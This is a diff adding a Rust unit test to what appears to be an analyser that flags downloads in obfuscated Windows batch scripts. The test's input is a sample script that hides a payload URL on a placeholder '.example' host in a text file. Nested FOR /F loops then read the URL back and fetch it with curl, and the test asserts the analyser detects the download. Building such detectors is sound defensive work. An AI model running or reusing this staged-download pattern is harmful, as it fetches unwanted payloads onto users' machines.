@@ -3825,6 +3825,28 @@ for /f "tokens=* delims=" %%F in ('dir /b C:\Work\*.txt') do for /f "tokens=* de
     }
 
     #[test]
+    fn for_f_dir_s_b_path_wildcard_emits_full_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-dir-s-b-path-wildcard.example/payload.exe>C:\Work\url.txt
+for /f "tokens=* delims=" %%F in ('dir /s /b C:\Work\*.txt') do for /f "tokens=* delims=" %%U in ('type %%F ^| find "https://"') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-dir-s-b-path-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F dir /s /b path wildcard did not emit a full generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_cmd_c_type_reads_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
